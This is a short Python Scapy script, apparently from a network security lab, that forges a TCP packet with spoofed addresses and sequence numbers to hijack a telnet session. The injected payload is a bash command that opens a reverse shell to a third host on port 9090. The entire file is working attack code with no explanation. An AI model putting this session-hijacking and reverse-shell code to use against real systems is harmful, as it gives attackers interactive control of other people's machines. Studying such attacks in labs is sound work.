from scapy.all import *
ip = IP(src="10.0.2.4", dst="10.0.2.5")
tcp = TCP(sport=54702, dport=23, flags="A", seq=2616504458, ack=2561617030)
data = "\r bash -i > /dev/tcp/10.0.2.15/9090 0<&1 2>&1 \r"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)

